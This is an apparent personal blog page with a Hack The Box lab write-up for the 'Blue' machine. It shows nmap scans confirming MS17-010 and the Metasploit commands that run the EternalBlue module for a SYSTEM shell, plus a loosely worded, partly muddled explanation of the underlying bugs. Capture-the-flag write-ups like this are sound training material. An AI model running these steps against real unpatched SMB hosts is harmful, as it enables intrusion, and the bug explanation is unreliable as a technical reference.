<!DOCTYPE html>
<html>
  <head>
    <title>DocDock Documentation</title>
    
      <meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<meta name="revised" content="2018-12-31T14:33:37 EST">
<title>Blue :: DocDock Documentation</title>
<link rel="shortcut icon" href="/images/favicon.png" type="image/x-icon" />
<link href="/css/font-awesome.min.css" rel="stylesheet">
<link href="/css/nucleus.css" rel="stylesheet">
<link href="/theme-flex/style.css" rel="stylesheet">

<link rel="stylesheet" href="/css/bootstrap.min.css">
<script src="/js/jquery-2.x.min.js"></script>
<script type="text/javascript">
      var baseurl = "\/";
</script>
<meta name="description" content="">



    
  </head>
  <body data-url="/hackthebox/boxes/blue/">
    
      <header>
  <div class="logo">
    
	
  
    

<h2 id="chickenpwny">ChickenPwny</h2>

  


  </div>
  <div class="burger"><a href="javascript:void(0);" style="font-size:15px;">&#9776;</a></div>
    <nav class="shortcuts">
            <li class="" role="">
                <a href="https://twitter.com/chickenpwny"  rel="noopener">
                  <i class='fa fa-twitter'></i> <label>Twitter</label>
                </a>
            </li>
            <li class="" role="">
                <a href="https://github.com/vjeantet/hugo-theme-docdock"  rel="noopener">
                  <i class='fa fa-github'></i> <label>Github repo</label>
                </a>
            </li>
            <li class="" role="">
                <a href="https://github.com/vjeantet/hugo-theme-docdock/archive/master.zip"  rel="noopener">
                  <i class='fa fa-cloud-download'></i> <label>Download</label>
                </a>
            </li>
            <li class="" role="">
                <a href="#"  rel="noopener">
                  <i class='fa fa-bookmark'></i> <label>Book Mark</label>
                </a>
            </li>
            <li class="" role="">
                <a href="/credits"  rel="noopener">
                  <i class='fa fa-bullhorn'></i> <label>Credits</label>
                </a>
            </li>
    </nav>
</header>
<article>
  <aside>
    <ul class="menu">
          <li data-nav-id="/" class="dd-item">
          <a href="/">
            <i class="fa fa-fw fa-home"></i>
          </a>
          </li>
    <li data-nav-id="/concepts/" class="dd-item haschildren
        ">
      <div>
      <a href="/concepts/">Concept</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
      </div>
        <ul>
    <li data-nav-id="/concepts/webapppentest/" class="dd-item haschildren
        ">
      <div>
      <a href="/concepts/webapppentest/">WebAppPenTests</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
      </div>
        <ul>
    <li data-nav-id="/concepts/webapppentest/lfi/" class="dd-item
        ">
      <div>
      <a href="/concepts/webapppentest/lfi/"> Local File inclusion</a><i class="fa fa-circle-thin read-icon"></i>
      </div>
    </li>
    <li data-nav-id="/concepts/webapppentest/heartbld/" class="dd-item
        ">
      <div>
      <a href="/concepts/webapppentest/heartbld/">HeartBleed</a><i class="fa fa-circle-thin read-icon"></i>
      </div>
    </li>
    <li data-nav-id="/concepts/webapppentest/osinjcmd/" class="dd-item
        ">
      <div>
      <a href="/concepts/webapppentest/osinjcmd/">OS Command Injection</a><i class="fa fa-circle-thin read-icon"></i>
      </div>
    </li>
    <li data-nav-id="/concepts/webapppentest/phptypejuggling/" class="dd-item
        ">
      <div>
      <a href="/concepts/webapppentest/phptypejuggling/">PHP Typw Juggling</a><i class="fa fa-circle-thin read-icon"></i>
      </div>
    </li>
        </ul>
    </li>
        </ul>
    </li>
    <li data-nav-id="/github/" class="dd-item haschildren
        ">
      <div>
      <a href="/github/">GitHub</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
      </div>
        <ul>
      <li data-nav-id="/github/hugopowershell/" class="dd-item">
        <div>
          <a href="/github/hugopowershell/">
            Hugo/Github/Power
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
        </ul>
    </li>
    <li data-nav-id="/hackthebox/" class="dd-item parent haschildren
        ">
      <div>
      <a href="/hackthebox/">HackTheBox</a>
            <i class="fa fa-angle-down fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
      </div>
        <ul>
    <li data-nav-id="/hackthebox/boxes/" class="dd-item parent haschildren
        ">
      <div>
      <a href="/hackthebox/boxes/">Boxes</a>
            <i class="fa fa-angle-down fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
      </div>
        <ul>
    <li data-nav-id="/hackthebox/boxes/blue/" class="dd-item parent active
        ">
      <div>
      <a href="/hackthebox/boxes/blue/">Blue</a><i class="fa fa-circle-thin read-icon"></i>
      </div>
    </li>
    <li data-nav-id="/hackthebox/boxes/crimestoppers/" class="dd-item
        ">
      <div>
      <a href="/hackthebox/boxes/crimestoppers/">CrimeStopper</a><i class="fa fa-circle-thin read-icon"></i>
      </div>
    </li>
    <li data-nav-id="/hackthebox/boxes/poison/" class="dd-item
        ">
      <div>
      <a href="/hackthebox/boxes/poison/">Poison</a><i class="fa fa-circle-thin read-icon"></i>
      </div>
    </li>
    <li data-nav-id="/hackthebox/boxes/valentine/" class="dd-item
        ">
      <div>
      <a href="/hackthebox/boxes/valentine/">Valentine</a><i class="fa fa-circle-thin read-icon"></i>
      </div>
    </li>
    <li data-nav-id="/hackthebox/boxes/waldo/" class="dd-item
        ">
      <div>
      <a href="/hackthebox/boxes/waldo/">Waldo</a><i class="fa fa-circle-thin read-icon"></i>
      </div>
    </li>
        </ul>
    </li>
    <li data-nav-id="/hackthebox/challenges/" class="dd-item haschildren
        ">
      <div>
      <a href="/hackthebox/challenges/">Miscellaneous</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
      </div>
        <ul>
      <li data-nav-id="/hackthebox/challenges/bloodhound/" class="dd-item">
        <div>
          <a href="/hackthebox/challenges/bloodhound/">
            
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
        </ul>
    </li>
        </ul>
    </li>
    <li data-nav-id="/help/" class="dd-item
        ">
      <div>
      <a href="/help/">Network Manager Down</a><i class="fa fa-circle-thin read-icon"></i>
      </div>
    </li>
    <li data-nav-id="/tools/" class="dd-item haschildren
        ">
      <div>
      <a href="/tools/">Tools</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
      </div>
        <ul>
      <li data-nav-id="/tools/bloodhound/" class="dd-item">
        <div>
          <a href="/tools/bloodhound/">
            BloodHound Neo4j
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/tools/ftp/" class="dd-item">
        <div>
          <a href="/tools/ftp/">
            FTP
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
    <li data-nav-id="/tools/portscanning/" class="dd-item haschildren
        ">
      <div>
      <a href="/tools/portscanning/">PortScannings</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
      </div>
        <ul>
    <li data-nav-id="/tools/portscanning/netcat/" class="dd-item
        ">
      <div>
      <a href="/tools/portscanning/netcat/">NetCat PORT SCAN</a><i class="fa fa-circle-thin read-icon"></i>
      </div>
    </li>
    <li data-nav-id="/tools/portscanning/nmap/" class="dd-item
        ">
      <div>
      <a href="/tools/portscanning/nmap/">Nmap</a><i class="fa fa-circle-thin read-icon"></i>
      </div>
    </li>
        </ul>
    </li>
    <li data-nav-id="/tools/webapp/" class="dd-item haschildren
        ">
      <div>
      <a href="/tools/webapp/">WebApps</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
      </div>
        <ul>
    <li data-nav-id="/tools/webapp/gobuster/" class="dd-item
        ">
      <div>
      <a href="/tools/webapp/gobuster/">GoBuster</a><i class="fa fa-circle-thin read-icon"></i>
      </div>
    </li>
      <li data-nav-id="/tools/webapp/sqlmap/sqlmap/" class="dd-item">
        <div>
          <a href="/tools/webapp/sqlmap/sqlmap/">
            SqlMap
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
    <li data-nav-id="/tools/webapp/wfuzz/" class="dd-item
        ">
      <div>
      <a href="/tools/webapp/wfuzz/">WFUZZ</a><i class="fa fa-circle-thin read-icon"></i>
      </div>
    </li>
        </ul>
    </li>
    <li data-nav-id="/tools/ssh/" class="dd-item haschildren
        ">
      <div>
      <a href="/tools/ssh/">ssh</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
      </div>
        <ul>
    <li data-nav-id="/tools/ssh/sshtunnling/" class="dd-item
        ">
      <div>
      <a href="/tools/ssh/sshtunnling/">SSHuttle</a><i class="fa fa-circle-thin read-icon"></i>
      </div>
    </li>
        </ul>
    </li>
        </ul>
    </li>




    </ul>
    <section>
    </section>
  </aside>
  <section class="page">
    
    <div class="nav-select">
      <center>Navigation : 
        <select onchange="javascript:location.href = this.value;">
          
    <option value="/concepts/" >
   Concept</option>
    <option value="/github/" >
   GitHub</option>
    <option value="/hackthebox/" >
   HackTheBox</option> 
    <option value="/hackthebox/boxes/" >
  - 
   Boxes</option> 
    <option value="/hackthebox/boxes/blue/"  selected>
  -- 
   Blue</option> 
  
    <option value="/hackthebox/boxes/crimestoppers/" >
  -- 
   CrimeStopper</option>
    <option value="/hackthebox/boxes/poison/" >
  -- 
   Poison</option>
    <option value="/hackthebox/boxes/valentine/" >
  -- 
   Valentine</option>
    <option value="/hackthebox/boxes/waldo/" >
  -- 
   Waldo</option>
  
    <option value="/hackthebox/challenges/" >
  - 
   Miscellaneous</option>
  
    <option value="/help/" >
   Network Manager Down</option>
    <option value="/tools/" >
   Tools</option>



        </select>
      </center>
    </div>
      <div>
        <div class="searchbox">
          <input data-search-input id="search-by" type="text" placeholder="Search...">
        </div>
        <script type="text/javascript" src="/js/lunr.min.js"></script>
        <script type="text/javascript" src="/js/auto-complete.js"></script>
        <link href="/css/auto-complete.css" rel="stylesheet">
        <script type="text/javascript">
          
              var baseurl = "\/";
          
        </script>
        <script type="text/javascript" src="/js/search.js"></script>
      </div>
    

    <h1>Blue</h1>
    
    
    



<h3 id="blue">Blue</h3>

<p>Special thanks to IppSec for contributing to this post. <a href="https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA">Please Subscribe</a></p>

<p><img src="https://chickenpwny.github.io/images/blue/blue_logo.jpg" alt="blue_logo" /></p>

<p>changes /etc/hosts so 10.10.10.40 blue.htb</p>

<pre><code>PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 82.62 seconds
</code></pre>

<p>Windows 7 Professional 7601 Service Pack 1</p>

<p>port 135 = RPC a couple buffer overflow attacks I doubt its vulnerable.</p>

<p>port 139 = NetBIOS is rarely vulnerable you can enumerate the system with it through gathering information</p>

<p>port 445 =  Smb server message block often exploitable. Don&rsquo;t count on it though.</p>

<h3 id="talking-about-enternalblue">Talking about EnternalBlue</h3>

<p>Atleast l wilI try to, for a detailed in-depth explanation <a href="https://research.checkpoint.com/eternalblue-everything-know/">Click Here</a></p>

<p>The exploit MS17-10, aka EternalBlue was used by an Nation State Advisory and after getting leaked and becoming public a different group used it to cryptolocker a good portion of internet connected SMB Hosts. SMB normally isn&rsquo;t connected to the internet, so it is doubtful the exploit is intended to be the initial infection.  It is was an excellent tool to move around a network laterally as SMB is used legitimately by Windows for domain management.  Today, it remains a way to gain SYSTEM access to unpatched system and attempt to find loot that is helpful.</p>

<p>EternalBlue exploits three bugs to achieve RCE</p>

<ol>
<li>Wrong Casting Bug &ndash; this leads to a buffer overflow</li>
<li>Wrong Parsing Function Bug &ndash; Using two functions, to trick the system they can&rsquo;t handle large packs so it will split packets into smaller packers. Since the first function breaks it will escape out SMB treats the last function as the first. This allows bug A to work by Treating Dword as word.</li>
<li>Non-paged Pool Allocation Bug &ndash; creates a hole in the heap stack allowing 1 &amp; 2 to write in memory.</li>
</ol>

<h3 id="exploiting-blue">Exploiting Blue</h3>

<p>Using nmap to check and make sure the vulnerability exist.</p>

<pre><code><div class="alert 
alert-danger"
 
role="alert"><p>Nmap -p445 &ndash;script vuln blue.htb -T4</p>
</div>

Starting Nmap 7.70 ( https://nmap.org ) at 2018-12-24 06:22 EST
Nmap scan report for blue.htb (10.10.10.40)
Host is up (0.13s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)                                                                       
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1                                                                    
|        servers (ms17-010).
|
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/                                               
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143

Nmap done: 1 IP address (1 host up) scanned in 26.47 seconds


</code></pre>

<p>Now, go into Metasploit. While running the exploit. It will fail a couple times so wait patiently for it to return a shell.</p>

<pre><code>msfconsole 

search lue

exploit/windows/smb/ms17_010_eternalblue    MS17-010 EternalBlue SMB Remote Windows

use exploit/windows/smb/ms17_010_eternalblue

set RHOST 10.10.10.40

run

</code></pre>

<p><img src="https://chickenpwny.github.io/images/blue/metasploit_blue.PNG" alt="metasploit_blue" /></p>

<p>The user flag is in c:\Users\haris\Desktop</p>

<div class="alert 
alert-info"
 
role="alert">type user.txt</div>


<p>The root flag is in c:\Users\Adimistrator\Desktop</p>

<div class="alert 
alert-success"
 
role="alert">type root.txt</div>




    
    
        <div class="chevrons">
    <div id="navigation">
<a class="nav nav-prev" href="/hackthebox/boxes/" title="Boxes"> <i class="fa fa-chevron-left"></i><label>Boxes</label></a>
    <a class="nav nav-next" href="/hackthebox/boxes/crimestoppers/" title="CrimeStopper" style="margin-right: 0px;"><label>CrimeStopper</label><i class="fa fa-chevron-right"></i></a></div>
  </div>

  </section>
</article>

<footer>

<div class="footline">
    

    

    

    
    <div class="github-link">
      <a href="https://github.com/vjeantet/hugo-theme-docdock/edit/master/exampleSite/content/HackTheBox/Boxes/Blue/_index.md" target="blank"><i class="fa fa-code-fork"></i>
        Improve this page</a>
    </div>
    
  </div>


	<div>


  
    Create a content/_footer.md file to customize the footer content
  



	</div>
</footer>

<script src="/js/clipboard.min.js"></script>

<link href="/css/featherlight.min.css" rel="stylesheet">
<script src="/js/featherlight.min.js"></script>



<script src="/theme-flex/script.js"></script>


    

    
    

    
  </body>
</html>